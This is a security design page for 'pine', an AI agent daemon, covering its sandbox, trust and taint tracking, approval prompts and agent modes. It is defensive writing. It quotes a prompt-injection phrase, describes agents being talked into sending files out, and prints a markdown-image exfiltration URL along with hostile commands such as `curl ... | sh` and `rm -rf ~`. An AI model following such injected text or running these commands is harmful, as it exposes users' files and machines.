# Security

pine runs models that read things strangers wrote and that can run commands. This page says
what is defended, how, and what is left.

## What can go wrong

| Threat | Example |
|---|---|
| Someone outside drives the daemon | A stranger messages your bot; a web page you have open posts to the control port; someone on the network calls a webhook |
| Prompt injection | A mail, web page, MQTT message or file name contains "ignore your instructions and ..." and the model follows it |
| An agent, misled or mistaken, damages the machine | `rm -rf ~`, overwriting another project, reading SSH keys |
| Information leaves | The agent is talked into sending your files to a URL, a chat or a device |
| The agent takes over the daemon | It writes an extension or changes its own configuration so that hostile code runs with the daemon's rights on the next start |

No model reliably tells instructions from data. pine therefore does not depend on the model
refusing; it limits what a run can do, by where its input came from.

## The layers

### 1. Who may speak

- **Telegram:** only the account you paired, or the user ids in `allow`, are heard. What anyone
  else writes reaches no agent. Pairing needs both ends: the bot sends a code to the account
  that wrote to it, and that code has to be typed into pine, which names the account. So a
  stranger cannot pair (they do not see your screen), you cannot pair a stranger by a slip of
  the finger (you do not have their code), and an account you deny is not asked about again.
  Once your account is paired, anybody else who writes to the bot gets no answer at all and
  causes no question.
- **Control API:** loopback by default; every request except `GET /health` and the webhooks
  (which carry their own secret) needs a bearer token (generated into `data/http-token`, mode
  600, which the CLI reads). Control requests carrying an `Origin` or `Sec-Fetch-Site` header
  or an unexpected `Host` are refused, so a web page in your browser cannot use it, with or
  without DNS rebinding. Bodies must be JSON and at most 1 MB (64 MB for a message with attached
  files).
- **Webhooks:** each hook has a secret (bearer or HMAC of the body) unless you set `"open":
  true`, a rate limit (120 requests a minute), and a fixed topic.
- **MQTT, watched folders:** you choose the topics and folders. What arrives is treated as
  outside content.
- **Event sources:** you configure them, or confirm what an agent sets up. One that nobody is
  subscribed to is not running (unless you gave it `"start": "always"`). What they report is outside content unless you mark the source
  as yours; see "Event sources" below.

### 2. Where content came from decides what it may do

Every event carries `trust`. It is `owner` when the content came through a channel that
authenticated you (a paired or allow-listed Telegram account, the control API), from a
schedule (one you wrote, or one an agent made at your wish), from a source you marked
`"trust": "owner"`, or from an agent's `publish_event` in a conversation that has read no
outside content. Everything else is `untrusted`.

A task started by an untrusted event runs with the agent's `untrusted` profile:

- built-in tools `read`, `grep`, `find`, `ls` only; no shell, no writing;
- no MCP servers, no delegation, no `publish_event`, no state writes, no sub-agents;
- none of the tools that change pine's setup or turn to you (`add_source`, `add_mcp_server`,
  `add_skill`, `add_schedule`, `subscribe`, `request_access`, `question`), no `todo`, no
  `manual`, no `download`;
- no command in the background, no goal, never app control, never a browser window on your
  screen;
- in its own session (`<name>~u`), so it neither sees your conversation nor leaves text in it.

These tools are not hidden from such a run; they are not registered in it. Each item of the
first two lines can be widened per agent (`"untrusted": { "stateWrite": true }`) or the agent
can refuse untrusted tasks altogether (`"untrusted": false`). Tasks an untrusted run hands on
stay untrusted for whoever receives them.

What you widen there is used as it is: such a run is never asked about what it reaches,
because nobody may be there to answer. Your `approve` list still asks, and so do critical
actions and what sends something out. `pine check` names every agent whose `untrusted`
profile has `bash`, `write` or `edit`.

A route may declare its events trusted (`"trust": "owner"`). Do that only for a source nobody
else can write to; `pine check` lists every such route.

One case is handled differently: an event of a source that one of your conversations is
subscribed to is delivered into that conversation, framed as data, and taints it (layer 4)
instead of starting a reduced run. "Event sources" below says why, and how `"separate": true`
gets the reduced run back.

### 3. The sandbox

Whether an agent's shell commands and file tool calls run inside a sandbox of the operating
system is decided by its **mode** ("Modes" below). The sandbox is Apple's `sandbox-exec` on
macOS and [bubblewrap](https://github.com/containers/bubblewrap) (`bwrap`) on Linux.

| Mode | Who has it | Sandbox | What the agent reaches |
|---|---|---|---|
| `auto` | The main agent, unless you say otherwise | Off | Your whole user account and the network, in your own conversations. See "The whole account" below. |
| `safe` | Every other agent, unless you say otherwise | On | Its own folders. The table that follows. |
| `manual` | An agent you set to it | On | As `safe`, and every action waits for you. |
| `bypass` | An agent you set to it | Off | As `auto`, and nothing is asked. |

Set the mode per agent with `mode`, or for all agents that name none with `defaults.mode`
([configuration.md](configuration.md)). A run that an event from outside started works in the
sandbox whatever the agent's mode is.

In the sandbox, the same on both systems:

| | |
|---|---|
| Can read | Its workspace, its private home, its skills, pine's manual (`docs/`), temp, the files its event sources received (see below), and the system outside your home folder (programs, libraries) |
| Can write | Its workspace, its private home (`sandbox/<id>/`, which is `$HOME` in its shell), temp. The main agent also `USER.md` in pine's home, and nothing else there |
| Cannot read or write | Your home folder, pine's home (configuration, `.env`, database, other agents' folders), other agents' workspaces |
| Cannot | Use the network (unless `sandbox.network` or you granted it to the conversation; the `download` tool is the exception described under Modes), signal or inspect other processes, or reach the services of your session: launching apps, AppleScript, the keychain or keyring, the clipboard, the session bus, the container daemon, an ssh agent |
| Can compute on | macOS: the graphics chip and the neural engine, which the system's own recognition of text and pictures runs on (a Swift script that reads the text of a scanned page with Vision works). They compute; they reach no file, address or other program |
| Environment | A handful of variables (`PATH`, `LANG`, ...). Nothing from the daemon's environment, no secrets. `HOME` is the private home. On macOS `CFFIXED_USER_HOME` names it too, so that Apple's libraries take the same home, and `CLANG_MODULE_CACHE_PATH` puts the compilers' cache of built modules into it (the first `swift` run of an agent builds them and takes a while) |

One part of pine's home is an agent's to read besides its own folders: the files its event
sources received (a camera's upload, a photo sent through Telegram), which lie in
`data/sources/<name>/`. An agent reads those of its own sources and of the sources it is
subscribed to, in every mode, and writes none of them; the rest of pine's data folder and the
files of other sources stay closed. See "Files a source received" in
[sources.md](sources.md).

How the two systems say it differs. On macOS the sandbox gets a profile that starts from
"deny everything" and allows what the table lists. On Linux the command is given a file
system of its own: everything read-only, your home folder and pine's home as empty folders
with the agent's own folders put back, a process list and a `/dev` of its own, no network
device, and a system call filter that refuses sockets to other programs on the machine
(behind those are the session bus, the keyring, a container daemon, a terminal multiplexer).
"On Linux" below lists where that leaves a difference.

In the sandbox the file tools (`read`, `write`, `edit`, `grep`, `find`, `ls`) do their I/O
through it rather than in the daemon. That closes the usual gap of "check the path, then open
it": replacing a file with a symlink after the check gains nothing, because the operating
system applies the policy at the moment of access. Without a sandbox (`auto`, `bypass`) a path
check in the daemon holds them: pine's home and program stay closed, and after outside
content the files that are read as instructions.

A conversation that you opened a folder for (`pine <folder>`, `/folder`, the folder in the UI's
bottom bar) can also read and write that folder, and its tools start there. That is the whole
of it: the folder is that conversation's and the sub-agents it starts, not the agent's other
conversations', not that of a run that outside
content started. Only you can open one; agents have no tool for it. pine's home, pine's own
program and other agents' workspaces are refused, also as part of a larger folder. The
folder's `AGENTS.md` and `CLAUDE.md` become instructions to the agent, so open folders whose
authors you would let instruct it. See [coding.md](coding.md).

#### On Linux

The sandbox is what `safe` and `manual` mode and every run started from outside work in; an
agent in `auto` or `bypass` mode needs none. It needs bubblewrap, and bubblewrap has to be
allowed to create user namespaces.
`pine init` takes care of both, and of the system libraries the browser of the web tools
needs: it looks at what is missing, shows the commands it would run as administrator, and runs
them after one yes (`sudo` asks for the password; `pine init --yes` does not ask). pine tries the sandbox once at each start. Where it does not work, `pine check`
gives the reason and pine behaves as on a machine without a sandbox (below).

What `pine init` does, and what it cannot do:

- **bubblewrap is missing**: it installs the package with the system's package manager (apt,
  dnf, yum, pacman, zypper, apk).
- **Ubuntu 24.04 and later** restrict user namespaces through AppArmor. pine writes a rule
  that allows them for bubblewrap, to `/etc/apparmor.d/bwrap`, and loads it:

  ```
  abi <abi/4.0>,
  include <tunables/global>

  profile bwrap /usr/bin/bwrap flags=(unconfined) {
    userns,
  }
  ```

  A file that is there already is left as it is and only loaded again. (Setting
  `kernel.apparmor_restrict_unprivileged_userns=0` would allow them for every program
  instead; pine does not do that.)
- **A container** (Docker, Podman) forbids a sandbox inside it unless it was started with the
  rights for one, and those cannot be given from inside. With pine as root in the container
  it needs `--cap-add SYS_ADMIN --cap-add NET_ADMIN --security-opt seccomp=unconfined
  --security-opt apparmor=unconfined`: to create namespaces, to give a sandbox without
  network its own loopback interface, and past Docker's system call filter and AppArmor
  profile, which forbid the sandbox's change of root and its mounts. As an ordinary user in
  the container it also needs `--security-opt systempaths=unconfined`, to mount the sandbox's
  own `/proc`. (`--privileged` does all of it.) Each was tried by leaving it out. `pine init`
  installs bubblewrap in the container and names the flags when a right is missing. Without them pine in a container has no agent sandbox; the container is then the
  only wall, and it is around all agents and pine's secrets together. That is a fair way to
  run pine in a container, and needs no flags: an agent whose mode nobody chose works in
  `auto` there ("Consequences worth knowing" below). The flags are for those who want `safe`
  mode inside a container, and they take away most of what the container itself protects.
- **No `sudo` and not root**: pine prints the commands for whoever administers the machine.
- **The browser's system libraries** (a server or a container image has few of them): where
  apt is, pine installs them through Playwright's own list of packages, with the same yes.
  Elsewhere it names what is missing; web search and page reading work without the browser.
- **A systemd unit** with `RestrictNamespaces=` or `PrivateUsers=`.

What differs from macOS:

| | macOS | Linux |
|---|---|---|
| Your home folder, pine's home | Access is refused | They are empty, read-only folders: a command sees that they exist, and in them only the way to the folders it was given |
| Instruction files, and a repository's hooks and configuration, in a run that read outside content (layer 4) | Cannot be written or created, at any depth | What exists is read-only. What did not exist can be created by a shell command, and pine removes it when the command ends. Both are looked for six folders deep, and not inside folders of installed packages or build output (`node_modules`, `.venv`, `dist`, `build`, `target` and the like) |
| Programs on the same machine (the session bus, the keyring, a container daemon, a terminal multiplexer, an editor's helper) | Without the network, no connection of any kind. Keychain, clipboard, AppleScript and launching apps are refused by name, also with the network | Without the network a command cannot make a socket to another program (a system call filter, on x86-64 and arm64; programs built for 32 bit do not run then). The session's folder (`/run/user`) is empty and the sockets in `/run` are covered, also with the network |
| With the network granted | Addresses only: the internet and your local network. Socket files stay closed, except in the agent's own folders (not the shared temp folder), where its own programs talk to each other | Also programs that listen on a socket file where the agent can read outside `/run` (a tmux server or an ssh agent in the temp folder), and those that listen on a socket without a file (an X server does) |
| Processes a command leaves in the background | Not ended by the sandbox ([coding.md](coding.md) says where they show) | The same without a sandbox (`auto`, `bypass`). In the sandbox they end with the command: its processes are a group of their own that ends with it |
| A command started in the background in a conversation that has read outside content | Runs with the same limits as one that is waited for | Refused. What such a command may not create is taken away when the command ends, and that is no protection while a command runs for hours. The agent runs it without `background` |
| pine run as root | Commands run as root | Commands run as root without root's special powers (capabilities), which they could otherwise use to undo the sandbox |

The file tools refuse a protected name at any depth on both systems; the rows above about
depth concern shell commands only.

The code pane of the terminal UI reads through the daemon, not through an agent: it lists and
shows files of the conversation's folder only, with links resolved, and runs `git` for the
changes inside a sandbox that cannot write and has no network, with the programs a repository
can name for git to start (diff drivers, text converters, hooks, a file system monitor)
switched off. Looking at a folder runs nothing from it.

Consequences worth knowing:

- An agent cannot change its own `agent.json`, its extensions or `pine.json`.
  It can change the files it is meant to keep: `AGENTS.md`, `SOUL.md` and `MEMORY.md` in its
  workspace, and for the main agent `USER.md` ([agents.md](agents.md)), until the session is
  restricted; see layer 4. Rules it must never change go into `agents/<id>/AGENTS.md`, which
  is outside its reach.
- In the sandbox `git`, `node`, `python`, `sed` and the like work. Tools that need files in
  your home (`~/.gitconfig`, `~/.npmrc`, `~/.ssh`, a toolchain installed there) see the
  agent's empty private home instead. Grant specific folders with `sandbox.read` /
  `sandbox.write`, or set the agent to `auto` mode.
- On a machine without a working sandbox (Linux without bubblewrap or without user
  namespaces, a container started without the rights for one, any other system), `auto`,
  `bypass` and `manual` work as everywhere. `safe` cannot be had there. An agent whose mode
  nobody chose works in `auto` instead, and `pine check` names it. An agent you set to `safe`
  gets no shell and is told why; its file tools work, held by a path check in the daemon. A
  run that an event from outside started gets no shell, and the commands of `command` sources
  are not run. `pine check` says all of this, and why there is no sandbox.
- A local MCP server that you added yourself is not sandboxed: it is your program with your
  rights. One that an agent added (`add_mcp_server`) runs where that agent's commands run:
  inside its sandbox in `safe` and `manual` mode, with your rights in `auto` and `bypass`
  mode (the dialog you confirm says which). One of yours that you mark `"sandboxed": true`
  runs the same way ([mcp.md](mcp.md)).
- `trustWorkspace` stays `false`: pi then loads nothing executable from the workspace, so an
  agent cannot plant an extension for the daemon to run.

### When a call needs something outside: pine asks you

An agent in the sandbox (`safe` or `manual` mode) does not have to know where it ends, and
does not have to think of asking. When one of its calls needs a file or folder of yours, or the network,
pine puts the question to you itself. It arrives like any approval, under the name
`request_access`, and says what is wanted and for which call.

| When | What happens |
|---|---|
| A file tool is given a path outside the agent's folders | You are asked before the call. Yes: it runs. No: it is refused, and the agent is told that you said no |
| A shell command names such a path (`cat /Users/you/notes/a.txt`, a redirect into one, `cp` to one) | You are asked before the command runs. Reading is asked for a path that exists; writing for the target of a redirect and for what `touch`, `mkdir`, `rm`, `mv`, `tee`, `cp` and the like name |
| A command writes `~` or `$HOME` for something that is in your home and not in the agent's private one | In the agent's shell `~` is its own private home (`sandbox/<id>/`). You are asked for the path in your home, and the agent is told to run the command again with that path written out |
| A command is refused something it did not name: a script opens a file, a program wants the network | macOS: pine reads the system's own reports of what the sandbox refused that command, asks you, and adds a line of its own to the end of the command's output: what was refused, what you answered, and to run the command again after a yes |

A yes is the grant `request_access` gives: it holds for that conversation and its sub-agents
until the conversation is reset or pine restarts. A no is kept for the conversation too: pine
does not ask for the same thing again there. The agent can still call `request_access` itself,
with a reason.

What is never asked: pine's home, pine's code and other agents' workspaces. No answer of yours
opens them, so the agent is told that they are closed and not to look for another way. What a
program looks for on its own account is not asked either unless the command names it: names
that start with a dot in your home, `Library`, the system's folders. The network is asked for
only when the command failed without it. A run that an event from outside started is never
asked about: it is told that it cannot be given more. After outside content the question says
so ("Careful: ..."), because the command may be what that content wanted.

How pine knows on macOS: every command's sandbox profile carries a text of its own, the system
writes each refusal into its log with that text, and pine reads the log for it (`log stream`,
which runs while an agent's commands run and for some seconds after, not all the time).
None of this decides anything. The sandbox has refused already; the report only tells pine
whom to ask, and what the agent gets is what you grant. On Linux the sandbox reports nothing,
and where the log cannot be read pine has less to go on: the paths a command names before it
runs, and after it the words of a failed command ("Operation not permitted", "Read-only file
system", "Could not resolve host").

### The whole account

An agent that is to do real work on your machine needs what you have at your terminal: your
projects, your programs and toolchains, your git and ssh setup, the network, and the ability to
stop a server it started a minute ago. In `auto` mode it has that, without asking for access,
because its commands run without a sandbox:

| | |
|---|---|
| Files | Everything your user account can open and change |
| Closed | pine's home (configuration, `.env`, database, other agents' folders), except its own folders there, and changing pine's program files. Not by the operating system: see "pine's own files without a sandbox" below |
| Network, processes, apps | As you: it can install packages, start and stop programs (`ps`, `sudo` and programs that sandbox themselves work as in your terminal), open a browser |
| Environment | Yours, with your home folder as `$HOME`. Variables whose name looks like a credential (`KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `AUTH`, ...) are left out, except the ssh agent's address; add what the agent should have with `sandbox.env` |

This is the reach `bypass` mode has. What differs from bypass is that `auto` checks what is
critical, and what happens once the conversation has read outside content, described below.
To keep an agent inside its own folders, set its mode to `safe`.

#### pine's own files without a sandbox

In the sandbox the operating system keeps an agent out of pine's home (configuration, `.env`,
the control API's token, other agents' folders) and from changing pine's program. Without
one, in `auto` and `bypass` mode, pine does it by reading what is about to run:

| What | How it is kept closed |
|---|---|
| A file tool (`read`, `write`, `edit`, ...) on a path in pine's home, or writing one in pine's program | Refused by a check in the daemon |
| A shell command that names a path in pine's home: written out, with `~` or `$HOME`, or with `..` from where the shell starts | Not run. The files the agent's event sources received are the exception: a command that reads them runs, one that plainly writes or deletes them does not |
| A shell command that plainly writes into pine's program files (a redirect, `touch`, `rm`, `cp` to it) | Not run |
| A shell command that starts the `pine` program, or names pine's control port on this computer | Not run |
| Any other shell command that names pine's program files and does more than look | Critical: you are asked, in every conversation (not in `bypass`) |

This is a net, not a wall. A command line is read, not followed: what a script or a variable
holds is not seen, a command that walks a whole folder (`grep -r secret ~`) is not followed
into pine's home, and a program the agent starts runs with your rights. Whoever holds the
token in `data/http-token` can answer approval requests and change modes. In a conversation
that has read nothing from outside, getting past the net takes a model acting against you by
itself. In one that has, nothing else stands in the way. For an agent that should not depend
on that, use `safe` mode.

### What asks you

No model judges what an agent does. In `auto` and `safe` mode the agent works without
asking, with two exceptions, and both are a question to you:

| The action | Examples | When you are asked |
|---|---|---|
| is critical | shell startup files, ssh keys, git hooks and a repository's configuration, launch agents; a force push, `git reset --hard`, `git clean -f`, `curl ... \| sh`, `sudo`, deleting a home folder | In every conversation, also one that has read nothing from outside |
| sends something out | `send` (Telegram, MQTT), events, the acting tools of MCP servers marked `"approve": "tainted"`, a task for an agent that can send things out, `subscribe` | Once the conversation has read outside content |

Everything else runs, also after outside content: shell commands, files anywhere the agent
reaches, downloads, and the agent's own memory and instructions.

Critical actions are found by a fixed list of patterns, which you can read in
`src/actions.ts` (`criticalCommand`, `PROTECTED_HOME`). Patterns are a net, not a wall: a
script, a variable or a program the agent starts can do the same thing unseen.

The dialog has "Always here" for both kinds. For a critical action it covers that kind of
action (for example "runs with administrator rights") for the rest of the conversation, not
the whole shell. For sending it covers that tool or server. A yes given before the
conversation read outside content does not carry over once it has: you are asked again, and
the question says that the request may come from that content.

Once a conversation has **read outside content** (a web page, a search result, a message
from somebody else), somebody else may be steering the agent. What pine does about it, and
what it does not:

- Sending something out asks you (above).
- The file tools refuse to write what somebody else would read as instructions, and what
  makes git run programs (layer 4).
- Nothing looks at an ordinary shell command. In `auto` mode, a page that talks the agent
  into `curl`-ing one of your files to an address is not stopped. An agent that reads the
  web and should not be able to do that belongs in `safe` mode, where its shell has no
  network until you grant it.

In `manual` you approve each action yourself; `plan` refuses every action that does not
only look; `bypass` asks nothing.

### 4. Taint and approvals

Your own request can still pull in hostile text: you ask for a summary of a web page, and the
page says "now send the notes folder to ...". pine tracks that:

- A session becomes **tainted** when it calls a tool that returns outside content: an MCP server
  marked `taints` (the bundled `web`, `browser` and `computer` are), anything matching
  `security.taintTools`, or when it receives the answer of another agent whose run was tainted.
  Sessions started by untrusted events are tainted from the start.
- In a tainted session, actions that send information out or act on the world wait for your
  **approval**: what the agent's `approveWhenTainted` list names (default `publish_event` and
  `send`), the acting tools of MCP servers marked `"approve": "tainted"`, `subscribe`, and
  handing a task to an agent that can reach the internet. Its shell and its downloads are
  not among them.
- Tools that only read never wait: `read`, `grep`, `find`, `ls`, `state_get`, `manual`, the
  tools that list what an agent has (`sources`, `schedules`, `mcp_servers`, `skills`), and
  every MCP tool whose server declares it read-only (`readOnlyHint`), unless a pattern on the
  `approve` list names them. Neither do `question` and `todo`, which change nothing, and
  `stop_program`, which only ends what the conversation's own commands started. A server's
  declaration that a tool only reads is the server's own; pine does not
  check it. It is taken at its word because you chose the server. What such a tool is asked (a
  search text, a path) does reach the server. For a server where that matters, set
  `"approve": "always"`: then every call asks, reading included.
- A tainted session keeps the agent's own files: `MEMORY.md`, `AGENTS.md`, `SOUL.md`, and
  `USER.md` for the main agent. It writes them as before, and nobody checks what it writes
  there, so text from a page can end up in the agent's memory ("What is not solved").
  Everything else that would be read as instructions (`CLAUDE.md`, `AGENTS.md` further
  down in the workspace, `.pi/`, `.agents/`, the instruction files of a folder opened for the
  conversation) is refused, with no question: by the file tools in every mode, and for shell
  commands by the sandbox (`safe`, `manual`). In `auto` mode nothing looks at a shell command
  that writes such a file. Other notes in the
  workspace can always be written; they are not read unless the agent opens them.
- A tainted session can still use git in a repository there (commit, branch, diff), but cannot
  change what makes git run programs: `.git/hooks` and `.git/config` (a hook, a hooks path, a
  pager, a file system monitor), also of submodules and of repositories further down, and it
  cannot move a `.git` folder aside to put another in its place. Anything put there would run
  with your rights the next time you use git in that folder. In the sandbox the operating
  system refuses it. Without one (`auto`) the file tools refuse it, and a shell command that
  names a hook or a repository's configuration is critical: you are asked. A session
  that has read no outside content can change them, like everything else in its folders.
- Events a tainted session publishes are `untrusted`.

An approval request arrives in the terminal UI as a dialog and in Telegram with buttons, showing
the agent, the tool and its arguments, and why you are asked. `pine approvals`,
`pine approve <id>` and `pine deny <id>` do the same from a terminal. No answer within
`security.approvalTimeout` means no. The agent is told the action was not approved and to report
instead of retrying.

There are three answers: allow once, deny, and **always in this conversation** ("Always here" in
the UI, the "Always: ..." button in Telegram, `pine approve <id> --always`). "Always" covers the
whole MCP server the tool belongs to, or the one tool if it is not from a server (`bash`, for
example), until the conversation is reset or the daemon restarts. For a critical action it
covers that kind of action. Two things to know:

- It is not offered for what you configured to ask every time (the `approve` list, a server with
  `"approve": "always"`).
- A yes given while the conversation was clean does not carry over once it has read outside
  content. You are asked again, and that answer then holds.

Taint lasts for the life of the session (`security.taint: "session"`), because the text is still
in the context. `/reset` in the terminal UI, or `pine reset`, clears it along with the
conversation. `/undo` clears it only when the message that is taken back is the one that
brought the outside content in: that text then leaves the context with the message, and
what you allowed the conversation while the message was worked on is taken back too.
`"run"` forgets it after each task, which is more convenient and weaker. `"off"` means no tool
call marks a conversation at all: what a subscribed source reports then arrives with full tools
and no questions. Runs that an outside event started stay restricted in every setting.

`approve` in `agent.json` lists actions that need approval every time in `manual` and `auto`
mode, tainted or not (bypass skips them like everything else):

```json
{ "approve": ["bash:*git push*", "send:house", "mcp__calendar__delete_*"] }
```

### Modes: how much an agent does without asking

Each agent has a mode. It decides what happens at the two boundaries above: the sandbox and the
approval prompts.

| Mode | Sandbox | What asks you |
|---|---|---|
| `auto` (the main agent, unless you say otherwise) | Off: shell and file tools reach your whole account and the network | Almost nothing. Your `approve` list asks. A critical action asks, in every conversation. After outside content, sending something out asks. See "What asks you" above |
| `safe` (every other agent, unless you say otherwise) | On: the agent's own folders. For anything beyond you are asked: by pine when a call needs it, or by the agent with `request_access` | As in `auto` |
| `manual` | On, where the machine has one | Every action that changes or sends something waits for you, unless you answered "always" for it in this conversation. Reading files and state and read-only MCP tools are free |
| `bypass` | Off: shell and file tools reach your whole account and the network | Nothing waits |
| `plan` | That of the mode the agent had before: planning lies on top of it | Nothing waits, because nothing is done: a call that does not only look is refused, without a question. See "Plan mode" below |

One setting says both things, so there is nothing else to set: an agent that should work with
your account is in `auto`, one that should stay in its folders is in `safe`. pine's own home
and program are closed in every mode, and a run that an event from outside started works in
the sandbox and is never asked, whatever the agent's mode.

The same actions in each mode:

| Action | `bypass` | `auto` | `safe` | `manual` |
|---|---|---|---|---|
| `ls`, `cat`, `git status`, reading files | runs | runs | runs | runs |
| `npm install`, `git commit`, editing a project file in your home | runs | runs | asks once for access to that folder, then runs | asks |
| `curl`, `git push`, anything that needs the network | runs | runs | asks once for network access, then runs | asks |
| Writing a file in its own workspace | runs | runs | runs | asks |
| `sudo`, a force push, `git reset --hard`, `curl ... \| sh`, shell startup files, ssh keys | runs | asks | asks | asks |
| Sending a Telegram message or an event after it has read a web page | asks, because bypass is paused then (below) | asks | asks | asks |

So `auto` asks rarely, `safe` asks whenever the agent has to leave its own folders, and
`manual` asks every time. Once a conversation in `bypass` has read outside content, bypass
is paused and it behaves like `auto`, in every row.

`request_access` is how an agent in the sandbox gets at something outside its
workspace: it names a path (read, or read and write) or asks for network access from its shell,
with a reason. You see the request like any approval. If you allow it, the access holds for that
conversation until you reset it or the daemon restarts. The agent does not have to call it:
when a call needs something outside, pine asks you the same question itself (see "When a call
needs something outside" above).

The bundled browser has one question of the same kind: when the agent opens an address on this
computer or your network (`http://localhost:5173`), you are asked, and a yes allows that host
and port for the conversation. See "Local addresses" in [mcp.md](mcp.md).

App control (the bundled `computer` server, macOS) has one as well: the first time the agent
looks at or acts in an app, you are asked, and a yes allows that app for the conversation.
After it, what the agent does there is not asked about click by click. Only an agent in `auto` or `bypass` mode has these tools, only in your own conversations,
never in a run started from outside. See [computer.md](computer.md).

**Sub-agents share their conversation's permissions.** A sub-agent is a copy of the agent doing
part of the conversation's job, so it works under what you allowed there: the access you
granted, your "always" answers, and your answer on whether the conversation keeps your account. It works the other way too: what a sub-agent asks for and
gets holds for the conversation and its other sub-agents, so you are asked once, not once per
copy. Nothing is widened by this: a sub-agent inherits the conversation's outside-content mark
as well, and another conversation of the same agent, or a run started by an outside event, has
none of it. An agent that a task is *delegated* to is a different agent with its own sandbox and
its own permissions.

**Downloads.** In the sandbox the shell has no network, but getting a file from a
server you connected is routine, so there is a `download` tool for it. It fetches an address into
the workspace, byte for byte, and reports size and SHA-256.

- An address on the origin of one of the agent's remote MCP servers (same scheme, host and port
  as the server's `url`) is fetched without a question. A redirect that leads elsewhere is not
  followed under this rule.
- A server's `headers` (its key) go with a download only for an address that one of that
  server's own tools returned in the same conversation, exactly as it was returned. The agent
  cannot make pine send the key to an address it thought of itself, a redirect takes no key
  along, and a server marked `taints: true` never has its key sent this way: a link in its
  answers may be somebody else's text. The key itself stays out of the conversation.
- An agent with the bundled `web` or `browser` server can already read any public address
  without asking, so it may also save what is there: any public https address is fetched without
  a question, also in a session that has read outside content. The `allowHosts` and `denyHosts`
  of the `web` server apply while the conversation has no network access of its own; its
  `allowPrivate` applies too, and then addresses on your network and plain http are fetched.
  The session is marked as having read outside content.
- Without web access, any other address needs network access for the conversation
  (`sandbox.network`, a grant from `request_access`, or `auto` or `bypass` mode). Without it the download is
  refused and you are not asked. With it, only https and only public addresses are fetched, and
  in a session that has read outside content the download asks first.
- The daemon does the fetching; the file is put in place the way the write tool writes: through
  the agent's sandbox where it works in one, so that the operating system decides where it may land. `limits.maxDownloadMb`
  (default 200) caps the size. Runs with the reduced tool set (layer 2) do not have the tool.

**Pictures in the terminal UI.** Showing pictures adds four read paths to the control API (see
[operations.md](operations.md)); all need the API token like everything else there.

- The path of a workspace picture comes from model output, so that endpoint serves only regular
  image and video files (checked by content, not by name) that really lie inside the agent's
  workspace or the folder opened for that conversation.
  It cannot be used to read other files, also not through a link.
- A picture at a web address is fetched only when you click it, never because an answer
  contains it. Otherwise `![](https://somewhere/?q=<your notes>)` in an answer would send data
  out the moment it is displayed.
- Picture files are decoded by macOS's `sips` (on Linux by `ffmpeg`) and videos by `ffmpeg`, both started without
  network access and without write access outside the temp folder, because the bytes can come
  from anywhere. "Open in player" hands the file to the system's player, which has no such
  limits; it only happens on your click.
- Pictures a tool returned are kept in `data/media/tool` (mode 600) for as long as the event
  log reaches back (`limits.eventRetentionDays`).

**Event sources.** A source ([sources.md](sources.md)) brings in content from outside by
design, and a subscription lets that content start an agent turn without you. What keeps this
safe:

- Events of a source are outside content unless you mark the source `"trust": "owner"`. By
  default an event is delivered into the conversation the agent subscribed in, framed as data,
  and that conversation is then tainted (layer 4): sending things out and acting on the world
  ask you first, bypass is paused. The agent does keep its tools there, as it does after
  reading a web page; with `"separate": true` on the subscription the event instead starts a
  run with the reduced tool set in a session of its own (layer 2), which is the stronger
  protection for sources that carry strangers' text.
- An agent can set up a source itself (`add_source`), but only in a conversation with you, and
  you confirm everything that opens something new: a folder outside its workspace (which it may
  then also read), a connection, a port, a source for all agents, a source to be trusted as
  yours. Only a folder in its own workspace goes through without a question, and
  not in a conversation that has read outside content or in manual mode. A secret that pine
  makes (a webhook's secret, an FTP drop's password) is not shown to the model: the agent is
  told the name of its `.env` entry. A password you tell the agent passes through the tool call
  once. Either way the value is stored in `.env`, never in `pine.json` or an `agent.json`, and
  is kept out of events and logs.
- Subscribing is something only you, or an agent in a conversation with you, can do. A run
  with the reduced tool set (started by an untrusted event through a route, or by a
  subscription with `"separate": true`) has no `subscribe` tool. In a conversation that has
  read outside content, which includes one that an event of a subscribed source arrived in,
  the tool asks you first: otherwise a web page or a file name could make an agent start
  listening to something.
- A source that nobody subscribed to is not running: no open port, no connection (unless you
  marked it `"start": "always"`).
- The `ftp` type only receives, needs a password, writes under names of its own choosing into
  its own folder, and can be limited to client addresses. The `webhook` type needs a secret
  unless it is set up with `"open": true`, which the dialog spells out.
- A subscription has a throttle (10 s unless you change it), so a device that reports every
  second cannot keep a model busy.

What no mode opens:

- pine's home: configuration, `.env`, credentials, the database, other agents' folders.
  Agents never write there. (In `auto` and `bypass` mode pine keeps that by reading what is
  about to run, not through the operating system: "pine's own files without a sandbox"
  above.) What they may set up goes through tools that check what they are
  given and write only that ([setup.md](setup.md)): an MCP server (`add_mcp_server`, which
  asks you in every mode with the name and the URL or command; a local server added this way
  runs where the agent's commands run, its sandbox or your account, never with the daemon's environment), event sources and subscriptions, and, for the
  main agent alone, a new agent (`create_agent`, which always asks you and shows its
  instructions) and a model server of your own (`add_model_server`: you confirm the address
  every time, before any request goes there; its key is typed into pine's dialog and kept in
  `.env`; the name cannot be a provider's that exists, so no stored key is sent to a new
  address; refused in a conversation that has read outside content). The main agent is also the
  one that changes and removes agents and changes pine's settings and routes (`update_agent`,
  `remove_agent`, `set_setting`, `add_route`, `remove_route`): each takes a few named values and checks them, shows you the
  change before it is made, notes where it gives an agent more (the account, the network,
  bypass mode), reads the configuration back through the loader and undoes what
  does not load, and is refused outright, without a question to you, in a conversation that
  has read outside content. It also lists, reads, pins, renames and removes conversations, its
  own and other agents' (`conversations`, `read_conversation`, `set_conversation`,
  `remove_conversation`): what another agent's tools returned is never shown to it, a
  conversation that holds outside content marks the one that reads it, the two that change
  something are refused after outside content, and a removal is always yours to confirm.
  What it does for another agent (`agent` on the tools for sources,
  servers, skills and schedules) is carried out by that agent's own tool under that agent's
  rules, and taking something away from another agent asks you every time. Only the main agent can set anything up for all agents. Runs with the reduced
  tool set (layer 2) have none of these tools, and a proposal from a conversation that has read
  outside content says so in the dialog, because a web page asking for "this handy server" is
  the obvious trick.
- pine's own program files, for writing.
- Runs started by untrusted events. They keep the `untrusted` profile and cannot ask for more.
  They work in the sandbox and are never asked, whatever the agent's mode: neither `auto`
  nor `manual` nor `bypass` applies to them.

And by default `bypass` is suspended in a session that has read outside content: from then on
that session behaves like `auto` until you reset it. A web page is exactly the moment someone
else may be steering the agent, and bypass plus a hostile page is your whole account. The pause
is never silent: the terminal UI prints a note, shows "bypass (paused)", and the agent itself
is told and will say so when you ask why something is still refused.

Two ways to have bypass regardless:

